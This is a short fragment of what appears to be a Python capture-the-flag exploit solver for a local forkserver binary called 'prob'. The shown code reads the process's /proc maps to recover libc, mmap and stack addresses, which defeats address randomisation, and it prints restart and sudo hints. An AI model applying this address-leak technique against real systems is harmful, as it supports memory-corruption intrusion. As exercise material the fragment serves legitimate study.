...
def main():
    ...
    ap.add_argument('--pid', type=int, help='local listener parent prob pid; default: oldest pgrep prob')
    ...
    if libc_base is None or mmap_base is None or (saved_rip is None and args.stack_end is None):
        pid = args.pid
        if pid is None:
            # prob is a forkserver. The newest `prob` is often a setuid child from a
            # previous connection and /proc/<pid>/maps may be unreadable. The oldest
            # process is the listener parent and keeps the same ASLR layout as all
            # children, so use that by default.
            pid = int(subprocess.check_output(['pgrep', '-o', 'prob'], text=True).strip())
        try:
            libc_base, mmap_base, stack_end = parse_maps(pid)
        except PermissionError as e:
            raise SystemExit(
                f'[-] cannot read /proc/{pid}/maps: {e}\n'
                '[*] You probably selected a setuid child. Restart the server and use:\n'
                '    pkill -x prob 2>/dev/null || true\n'
                '    ./prob\n'
                '    python3 prob_solve.py 127.0.0.1 5000 --pid $(pgrep -o prob)\n'
                '[*] If your /proc is mounted with hidepid/Yama restrictions, run the solver with sudo.\n'
            )
